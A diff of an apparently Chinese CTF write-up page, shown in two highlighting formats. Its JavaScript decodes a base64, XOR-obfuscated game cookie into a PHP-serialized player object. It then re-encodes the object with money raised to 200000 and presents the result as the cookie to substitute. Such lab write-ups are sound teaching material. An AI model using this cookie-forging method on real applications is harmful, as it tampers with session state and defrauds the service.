-<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
-<span class="javascript">			&#125; <span class="hljs-keyword">else</span> &#123;</span>
-<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &gt;&gt; <span class="hljs-number">12</span>) | <span class="hljs-number">224</span>);</span>
-<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode(((c &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
-<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
-			&#125;
- 
-		&#125;
-<span class="javascript">		<span class="hljs-keyword">return</span> utftext;</span>
-	&#125;
- 
-<span class="javascript">	<span class="hljs-comment">// private method for UTF-8 decoding</span></span>
-<span class="javascript">	_utf8_decode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">utftext</span>) </span>&#123;</span>
-<span class="javascript">		<span class="hljs-keyword">var</span> string = <span class="hljs-string">&quot;&quot;</span>;</span>
-<span class="javascript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
-<span class="javascript">		<span class="hljs-keyword">var</span> c = c1 = c2 = <span class="hljs-number">0</span>;</span>
-<span class="javascript">		<span class="hljs-keyword">while</span> ( i &lt; utftext.length ) &#123;</span>
-			c = utftext.charCodeAt(i);
-			if (c &lt; 128) &#123;
-<span class="javascript">				string += <span class="hljs-built_in">String</span>.fromCharCode(c);</span>
-				i++;
-<span class="javascript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">191</span>) &amp;&amp; (c &lt; <span class="hljs-number">224</span>)) &#123;</span>
-				c2 = utftext.charCodeAt(i+1);
-<span class="javascript">				string += <span class="hljs-built_in">String</span>.fromCharCode(((c &amp; <span class="hljs-number">31</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c2 &amp; <span class="hljs-number">63</span>));</span>
-				i += 2;
-<span class="javascript">			&#125; <span class="hljs-keyword">else</span> &#123;</span>
-				c2 = utftext.charCodeAt(i+1);
-				c3 = utftext.charCodeAt(i+2);
-<span class="javascript">				string += <span class="hljs-built_in">String</span>.fromCharCode(((c &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">12</span>) | ((c2 &amp; <span class="hljs-number">63</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c3 &amp; <span class="hljs-number">63</span>));</span>
-				i += 3;
-			&#125;
-		&#125;
-<span class="javascript">		<span class="hljs-keyword">return</span> string;</span>
-	&#125;
-&#125;
-
-
-<span class="javascript"><span class="hljs-comment">//原来cookie</span></span>
-<span class="javascript"><span class="hljs-keyword">var</span> temp = <span class="hljs-string">&quot;UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo/BTzBxKbu6fbrB+H+ps3nsLrP6dCs0LgR8fj1/+6y3+/apJ3XnJnkjNPf0NnRjpPD7pjzzfaMiJDcxt/XkP/B+I2C5vTqgUE=&quot;</span>;</span>
-<span class="javascript"><span class="hljs-comment">//进行加密，获取明文</span></span>
-
-<span class="javascript"><span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> Base64();</span>
-<span class="javascript"><span class="hljs-keyword">var</span> result = base.decode(temp);</span>
-<span class="javascript"><span class="hljs-keyword">var</span> result3 = <span class="hljs-string">&quot;&quot;</span>;</span>
-for (i = 0; i &lt; result.length; i++) &#123;
-<span class="javascript">	<span class="hljs-keyword">var</span> num = result[i].charCodeAt();</span>
-	num = num ^ i;
-	num = num - ((i % 10) + 2);
-<span class="javascript">	result3 += <span class="hljs-built_in">String</span>.fromCharCode(num);</span>
-&#125;
-    
-<span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;原明文：&quot;</span>+result3+<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>);</span>
-<span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>);</span>
-
-<span class="javascript"><span class="hljs-keyword">var</span> result3 = <span class="hljs-string">&#x27;O:5:&quot;human&quot;:10:&#123;s:8:&quot;xueliang&quot;;i:830;s:5:&quot;neili&quot;;i:602;s:5:&quot;lidao&quot;;i:95;s:6:&quot;dingli&quot;;i:63;s:7:&quot;waigong&quot;;i:0;s:7:&quot;neigong&quot;;i:0;s:7:&quot;jingyan&quot;;i:0;s:6:&quot;yelian&quot;;i:0;s:5:&quot;money&quot;;i:200000;s:4:&quot;flag&quot;;s:1:&quot;0&quot;;&#125;&#x27;</span>;</span>
-<span class="javascript"><span class="hljs-comment">//反编码获取cookie</span></span>
-<span class="javascript"><span class="hljs-keyword">var</span> result = <span class="hljs-string">&quot;&quot;</span>;</span>
-for (i = 0;i&lt;result3.length;i++)&#123;
-	num = result3[i].charCodeAt();
-	num = num + ((i % 10) + 2);
-	num = num ^ i;
-<span class="javascript">	result += <span class="hljs-built_in">String</span>.fromCharCode(num);</span>
-&#125;
-<span class="javascript"><span class="hljs-keyword">var</span> temp= base.encode(result);</span>
-
-<span class="javascript"><span class="hljs-comment">//将cookie进行url编码</span></span>
-<span class="javascript">temp = <span class="hljs-built_in">encodeURIComponent</span>(temp);</span>
-<span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;cookie:&quot;</span>+temp+<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>);</span>
-<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span>
+<span class="language-javascript"></span>
+<span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Base64</span>(<span class="hljs-params"></span>) &#123;</span>
+<span class="language-javascript"> </span>
+<span class="language-javascript">	<span class="hljs-comment">// private property</span></span>
+<span class="language-javascript">	_keyStr = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span>
+<span class="language-javascript"> </span>
+<span class="language-javascript">	<span class="hljs-comment">// public method for encoding</span></span>
+<span class="language-javascript">	<span class="hljs-variable language_">this</span>.<span class="hljs-property">encode</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">input</span>) &#123;</span>
+<span class="language-javascript">		<span class="hljs-keyword">var</span> output = <span class="hljs-string">&quot;&quot;</span>;</span>
+<span class="language-javascript">		<span class="hljs-keyword">var</span> chr1, chr2, chr3, enc1, enc2, enc3, enc4;</span>
+<span class="language-javascript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
+<span class="language-javascript">		<span class="hljs-comment">//input = _utf8_encode(input); (注释掉这个函数调用)</span></span>
+<span class="language-javascript">		<span class="hljs-keyword">while</span> (i &lt; input.<span class="hljs-property">length</span>) &#123;</span>
+<span class="language-javascript">			chr1 = input.<span class="hljs-title function_">charCodeAt</span>(i++);</span>
+<span class="language-javascript">			chr2 = input.<span class="hljs-title function_">charCodeAt</span>(i++);</span>
+<span class="language-javascript">			chr3 = input.<span class="hljs-title function_">charCodeAt</span>(i++);</span>
+<span class="language-javascript">			enc1 = chr1 &gt;&gt; <span class="hljs-number">2</span>;</span>
+<span class="language-javascript">			enc2 = ((chr1 &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">4</span>) | (chr2 &gt;&gt; <span class="hljs-number">4</span>);</span>
+<span class="language-javascript">			enc3 = ((chr2 &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">2</span>) | (chr3 &gt;&gt; <span class="hljs-number">6</span>);</span>
+<span class="language-javascript">			enc4 = chr3 &amp; <span class="hljs-number">63</span>;</span>
+<span class="language-javascript">			<span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr2)) &#123;</span>
+<span class="language-javascript">				enc3 = enc4 = <span class="hljs-number">64</span>;</span>
+<span class="language-javascript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr3)) &#123;</span>
+<span class="language-javascript">				enc4 = <span class="hljs-number">64</span>;</span>
+<span class="language-javascript">			&#125;</span>
+<span class="language-javascript">			output = output +</span>
+<span class="language-javascript">			_keyStr.<span class="hljs-title function_">charAt</span>(enc1) + _keyStr.<span class="hljs-title function_">charAt</span>(enc2) +</span>
+<span class="language-javascript">			_keyStr.<span class="hljs-title function_">charAt</span>(enc3) + _keyStr.<span class="hljs-title function_">charAt</span>(enc4);</span>
+<span class="language-javascript">		&#125;</span>
+<span class="language-javascript">		<span class="hljs-keyword">return</span> output;</span>
+<span class="language-javascript">	&#125;</span>
+<span class="language-javascript"> </span>
+<span class="language-javascript">	<span class="hljs-comment">// public method for decoding</span></span>
+<span class="language-javascript">	<span class="hljs-variable language_">this</span>.<span class="hljs-property">decode</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">input</span>) &#123;</span>
+<span class="language-javascript">		<span class="hljs-keyword">var</span> output = <span class="hljs-string">&quot;&quot;</span>;</span>
+<span class="language-javascript">		<span class="hljs-keyword">var</span> chr1, chr2, chr3;</span>
+<span class="language-javascript">		<span class="hljs-keyword">var</span> enc1, enc2, enc3, enc4;</span>
+<span class="language-javascript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
+<span class="language-javascript">		input = input.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[^A-Za-z0-9\+\/\=]/g</span>, <span class="hljs-string">&quot;&quot;</span>);</span>
+<span class="language-javascript">		<span class="hljs-keyword">while</span> (i &lt; input.<span class="hljs-property">length</span>) &#123;</span>
+<span class="language-javascript">			enc1 = _keyStr.<span class="hljs-title function_">indexOf</span>(input.<span class="hljs-title function_">charAt</span>(i++));</span>
+<span class="language-javascript">			enc2 = _keyStr.<span class="hljs-title function_">indexOf</span>(input.<span class="hljs-title function_">charAt</span>(i++));</span>
+<span class="language-javascript">			enc3 = _keyStr.<span class="hljs-title function_">indexOf</span>(input.<span class="hljs-title function_">charAt</span>(i++));</span>
+<span class="language-javascript">			enc4 = _keyStr.<span class="hljs-title function_">indexOf</span>(input.<span class="hljs-title function_">charAt</span>(i++));</span>
+<span class="language-javascript">			chr1 = (enc1 &lt;&lt; <span class="hljs-number">2</span>) | (enc2 &gt;&gt; <span class="hljs-number">4</span>);</span>
+<span class="language-javascript">			chr2 = ((enc2 &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">4</span>) | (enc3 &gt;&gt; <span class="hljs-number">2</span>);</span>
+<span class="language-javascript">			chr3 = ((enc3 &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">6</span>) | enc4;</span>
+<span class="language-javascript">			output = output + <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(chr1);</span>
+<span class="language-javascript">			<span class="hljs-keyword">if</span> (enc3 != <span class="hljs-number">64</span>) &#123;</span>
+<span class="language-javascript">				output = output + <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(chr2);</span>
+<span class="language-javascript">			&#125;</span>
+<span class="language-javascript">			<span class="hljs-keyword">if</span> (enc4 != <span class="hljs-number">64</span>) &#123;</span>
+<span class="language-javascript">				output = output + <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(chr3);</span>
+<span class="language-javascript">			&#125;</span>
+<span class="language-javascript">		&#125;</span>
+<span class="language-javascript">		<span class="hljs-comment">//output = _utf8_decode(output);</span></span>
+<span class="language-javascript">		<span class="hljs-keyword">return</span> output;</span>
+<span class="language-javascript">	&#125;</span>
+<span class="language-javascript"> </span>
+<span class="language-javascript">	<span class="hljs-comment">// private method for UTF-8 encoding</span></span>
+<span class="language-javascript">	_utf8_encode = <span class="hljs-keyword">function</span> (<span class="hljs-params">string</span>) &#123;</span>
+<span class="language-javascript">		string = string.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\r\n/g</span>,<span class="hljs-string">&quot;\n&quot;</span>);</span>
+<span class="language-javascript">		<span class="hljs-keyword">var</span> utftext = <span class="hljs-string">&quot;&quot;</span>;</span>
+<span class="language-javascript">		<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> n = <span class="hljs-number">0</span>; n &lt; string.<span class="hljs-property">length</span>; n++) &#123;</span>
+<span class="language-javascript">			<span class="hljs-keyword">var</span> c = string.<span class="hljs-title function_">charCodeAt</span>(n);</span>
+<span class="language-javascript">			<span class="hljs-keyword">if</span> (c &lt; <span class="hljs-number">128</span>) &#123;</span>
+<span class="language-javascript">				utftext += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(c);</span>
+<span class="language-javascript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">127</span>) &amp;&amp; (c &lt; <span class="hljs-number">2048</span>)) &#123;</span>
+<span class="language-javascript">				utftext += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &gt;&gt; <span class="hljs-number">6</span>) | <span class="hljs-number">192</span>);</span>
+<span class="language-javascript">				utftext += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
+<span class="language-javascript">			&#125; <span class="hljs-keyword">else</span> &#123;</span>
+<span class="language-javascript">				utftext += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &gt;&gt; <span class="hljs-number">12</span>) | <span class="hljs-number">224</span>);</span>
+<span class="language-javascript">				utftext += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(((c &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
+<span class="language-javascript">				utftext += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
+<span class="language-javascript">			&#125;</span>
+<span class="language-javascript"> </span>
+<span class="language-javascript">		&#125;</span>
+<span class="language-javascript">		<span class="hljs-keyword">return</span> utftext;</span>
+<span class="language-javascript">	&#125;</span>
+<span class="language-javascript"> </span>
+<span class="language-javascript">	<span class="hljs-comment">// private method for UTF-8 decoding</span></span>
+<span class="language-javascript">	_utf8_decode = <span class="hljs-keyword">function</span> (<span class="hljs-params">utftext</span>) &#123;</span>
+<span class="language-javascript">		<span class="hljs-keyword">var</span> string = <span class="hljs-string">&quot;&quot;</span>;</span>
+<span class="language-javascript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
+<span class="language-javascript">		<span class="hljs-keyword">var</span> c = c1 = c2 = <span class="hljs-number">0</span>;</span>
+<span class="language-javascript">		<span class="hljs-keyword">while</span> ( i &lt; utftext.<span class="hljs-property">length</span> ) &#123;</span>
+<span class="language-javascript">			c = utftext.<span class="hljs-title function_">charCodeAt</span>(i);</span>
+<span class="language-javascript">			<span class="hljs-keyword">if</span> (c &lt; <span class="hljs-number">128</span>) &#123;</span>
+<span class="language-javascript">				string += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(c);</span>
+<span class="language-javascript">				i++;</span>
+<span class="language-javascript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">191</span>) &amp;&amp; (c &lt; <span class="hljs-number">224</span>)) &#123;</span>
+<span class="language-javascript">				c2 = utftext.<span class="hljs-title function_">charCodeAt</span>(i+<span class="hljs-number">1</span>);</span>
+<span class="language-javascript">				string += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(((c &amp; <span class="hljs-number">31</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c2 &amp; <span class="hljs-number">63</span>));</span>
+<span class="language-javascript">				i += <span class="hljs-number">2</span>;</span>
+<span class="language-javascript">			&#125; <span class="hljs-keyword">else</span> &#123;</span>
+<span class="language-javascript">				c2 = utftext.<span class="hljs-title function_">charCodeAt</span>(i+<span class="hljs-number">1</span>);</span>
+<span class="language-javascript">				c3 = utftext.<span class="hljs-title function_">charCodeAt</span>(i+<span class="hljs-number">2</span>);</span>
+<span class="language-javascript">				string += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(((c &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">12</span>) | ((c2 &amp; <span class="hljs-number">63</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c3 &amp; <span class="hljs-number">63</span>));</span>
+<span class="language-javascript">				i += <span class="hljs-number">3</span>;</span>
+<span class="language-javascript">			&#125;</span>
+<span class="language-javascript">		&#125;</span>
+<span class="language-javascript">		<span class="hljs-keyword">return</span> string;</span>
+<span class="language-javascript">	&#125;</span>
+<span class="language-javascript">&#125;</span>
+<span class="language-javascript"></span>
+<span class="language-javascript"></span>
+<span class="language-javascript"><span class="hljs-comment">//原来cookie</span></span>
+<span class="language-javascript"><span class="hljs-keyword">var</span> temp = <span class="hljs-string">&quot;UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo/BTzBxKbu6fbrB+H+ps3nsLrP6dCs0LgR8fj1/+6y3+/apJ3XnJnkjNPf0NnRjpPD7pjzzfaMiJDcxt/XkP/B+I2C5vTqgUE=&quot;</span>;</span>
+<span class="language-javascript"><span class="hljs-comment">//进行加密，获取明文</span></span>
+<span class="language-javascript"></span>
+<span class="language-javascript"><span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Base64</span>();</span>
+<span class="language-javascript"><span class="hljs-keyword">var</span> result = base.<span class="hljs-title function_">decode</span>(temp);</span>
+<span class="language-javascript"><span class="hljs-keyword">var</span> result3 = <span class="hljs-string">&quot;&quot;</span>;</span>
+<span class="language-javascript"><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; result.<span class="hljs-property">length</span>; i++) &#123;</span>
+<span class="language-javascript">	<span class="hljs-keyword">var</span> num = result[i].<span class="hljs-title function_">charCodeAt</span>();</span>
+<span class="language-javascript">	num = num ^ i;</span>
+<span class="language-javascript">	num = num - ((i % <span class="hljs-number">10</span>) + <span class="hljs-number">2</span>);</span>
+<span class="language-javascript">	result3 += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(num);</span>
+<span class="language-javascript">&#125;</span>
+<span class="language-javascript">    </span>
+<span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;原明文：&quot;</span>+result3+<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>);</span>
+<span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>);</span>
+<span class="language-javascript"></span>
+<span class="language-javascript"><span class="hljs-keyword">var</span> result3 = <span class="hljs-string">&#x27;O:5:&quot;human&quot;:10:&#123;s:8:&quot;xueliang&quot;;i:830;s:5:&quot;neili&quot;;i:602;s:5:&quot;lidao&quot;;i:95;s:6:&quot;dingli&quot;;i:63;s:7:&quot;waigong&quot;;i:0;s:7:&quot;neigong&quot;;i:0;s:7:&quot;jingyan&quot;;i:0;s:6:&quot;yelian&quot;;i:0;s:5:&quot;money&quot;;i:200000;s:4:&quot;flag&quot;;s:1:&quot;0&quot;;&#125;&#x27;</span>;</span>
+<span class="language-javascript"><span class="hljs-comment">//反编码获取cookie</span></span>
+<span class="language-javascript"><span class="hljs-keyword">var</span> result = <span class="hljs-string">&quot;&quot;</span>;</span>
+<span class="language-javascript"><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>;i&lt;result3.<span class="hljs-property">length</span>;i++)&#123;</span>
+<span class="language-javascript">	num = result3[i].<span class="hljs-title function_">charCodeAt</span>();</span>
+<span class="language-javascript">	num = num + ((i % <span class="hljs-number">10</span>) + <span class="hljs-number">2</span>);</span>
+<span class="language-javascript">	num = num ^ i;</span>
+<span class="language-javascript">	result += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(num);</span>
+<span class="language-javascript">&#125;</span>
+<span class="language-javascript"><span class="hljs-keyword">var</span> temp= base.<span class="hljs-title function_">encode</span>(result);</span>
+<span class="language-javascript"></span>
+<span class="language-javascript"><span class="hljs-comment">//将cookie进行url编码</span></span>
+<span class="language-javascript">temp = <span class="hljs-built_in">encodeURIComponent</span>(temp);</span>
+<span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;cookie:&quot;</span>+temp+<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>);</span>
+<span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
 </code></pre></div>
 
 
 
 <p>编码结果</p>
-<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo</span>%<span class="hljs-number">2</span>FBTzBxKbu<span class="hljs-number">6</span>fbrB%<span class="hljs-number">2</span>BH%<span class="hljs-number">2</span>Bps<span class="hljs-number">3</span>nsLrP<span class="hljs-number">6</span>dCs<span class="hljs-number">0</span>LgR<span class="hljs-number">8</span>fj<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>B<span class="hljs-number">6</span>y<span class="hljs-number">3</span>%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>FapJ<span class="hljs-number">3</span>XnJnkjNPf<span class="hljs-number">0</span>NnRjpPD<span class="hljs-number">7</span>paIiIiIhovBiIL<span class="hljs-number">4</span>kNTK<span class="hljs-number">0</span>dea%<span class="hljs-number">2</span>F<span class="hljs-number">7</span>mC%<span class="hljs-number">2</span>B<span class="hljs-number">4</span>bu%<span class="hljs-number">2</span>FOr<span class="hljs-number">1</span>SQ%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D</code></pre></div>
+<div class="hljs"><pre><code class="hljs gcode">UTw<span class="hljs-number">7</span>PCxqe<span class="hljs-number">3</span>FjcC<span class="hljs-number">42</span>OThOjWtSUFYwb<span class="hljs-name">m99</span>amlzb<span class="hljs-name">G0</span>wI<span class="hljs-number">3</span>MeHBsUZ<span class="hljs-number">1</span>liZxQMWEFDXl<span class="hljs-number">8</span>EdUUOCgACd<span class="hljs-number">016</span>B<span class="hljs-number">34</span>WUlFWWTVoATEAAXF<span class="hljs-number">5</span>P<span class="hljs-number">3</span>Z<span class="hljs-number">2</span>CmYgPTY<span class="hljs-number">5</span>Pj<span class="hljs-number">90</span>FSUUaGUfL<span class="hljs-number">2</span>Z<span class="hljs-symbol">nYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4</span>FXEcXREo<span class="hljs-meta">%</span><span class="hljs-number">2</span>FBTzBxKbu<span class="hljs-number">6</span>fbrB<span class="hljs-meta">%</span><span class="hljs-number">2</span>BH<span class="hljs-meta">%</span><span class="hljs-number">2</span>Bps<span class="hljs-number">3</span><span class="hljs-symbol">nsLrP6</span>dCs<span class="hljs-number">0</span>LgR<span class="hljs-number">8</span>fj<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>F<span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-number">6</span>y<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-meta">%</span><span class="hljs-number">2</span>FapJ<span class="hljs-number">3</span>X<span class="hljs-symbol">nJnkjNPf0</span><span class="hljs-symbol">NnRjpPD7</span>paIiIiIhovBiIL<span class="hljs-number">4</span>k<span class="hljs-symbol">NTK0</span>dea<span class="hljs-meta">%</span><span class="hljs-number">2</span>F<span class="hljs-number">7</span>mC<span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-number">4</span>bu<span class="hljs-meta">%</span><span class="hljs-number">2</span>FOr<span class="hljs-number">1</span>SQ<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">3</span>D</code></pre></div>
 
 <p>这就是我们期待的cookie,然后用工具修改cookie</p>
 <p><img src="https://i.loli.net/2020/11/25/WMk48YRo5veBxXr.png" srcset="/img/loading.gif" alt="nt-9.png"></p>
